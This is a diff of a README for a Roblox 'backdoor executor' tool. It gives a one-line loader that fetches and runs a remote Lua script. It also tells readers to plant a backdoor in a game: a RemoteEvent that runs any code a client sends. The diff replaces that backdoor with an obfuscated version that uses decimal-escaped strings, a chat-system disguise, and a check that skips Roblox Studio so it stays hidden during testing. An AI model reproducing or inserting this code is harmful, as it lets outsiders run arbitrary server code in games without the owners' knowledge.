@@ -10,7 +10,7 @@ Just copy the script below and execute it through your executor.
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/backdoor-executor.lua"))()
 ```
 ### Requirements
-- A brain that can read this stuffs
+- A brain that knows this stuff
 - Decent executor that supports filesystem functions (for config)
 ### Authors
 **jLn0n**
@@ -55,12 +55,8 @@ loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-sc
 
 ## Adding a backdoor in your game
 Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
-Make sure to enable `Loadstring` in `ServerScriptService`. (credits to [backdoor.exe](https://github.com/iK4oS/backdoor.exe) for me copying this thingy(and modifying it).)
+Make sure to enable `LoadStringEnabled` property in `ServerScriptService`.
 ```lua
-local Remote = Instance.new("RemoteEvent")
-Remote.Name = tostring(math.random(1, 99999999))
-Remote.Parent = game:GetService("Chat"):WaitForChild("ClientChatModules").MessageCreatorModules
-Remote.OnServerEvent:Connect(function(player, source)
-	loadstring(source)()
-end)
+if game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() or not game:GetService("\83\101\114\118\101\114\83\99\114\105\112\116\83\101\114\118\105\99\101").LoadStringEnabled then return end
+local a1 = Instance.new("\82\101\109\111\116\101\69\118\101\110\116"); a1.Name = "\71\101\116\80\108\97\121\101\114\77\101\115\115\97\103\101\65\115\121\110\99"; a1.Parent=game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101"):WaitForChild("\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115"); a1.OnServerEvent:Connect(function(_, a2)loadstring(a2)()end)
 ```
